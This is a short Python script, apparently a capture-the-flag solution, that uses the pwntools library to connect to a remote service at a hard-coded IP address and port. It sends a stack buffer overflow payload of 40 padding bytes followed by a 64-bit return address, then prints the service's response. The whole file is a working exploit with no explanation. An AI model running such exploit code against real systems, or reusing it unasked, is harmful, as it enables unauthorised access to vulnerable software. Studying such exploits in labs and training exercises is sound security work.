from pwn import *

def exploit_binary():
    conn = remote('3.110.66.92', 30553) 
    payload = b'A' * 40 + p64(0x4017e5) + b'\n'  
    conn.recvline()

    conn.sendline(payload)

    print(conn.recvall().decode())

if __name__ == "__main__":
    exploit_binary()
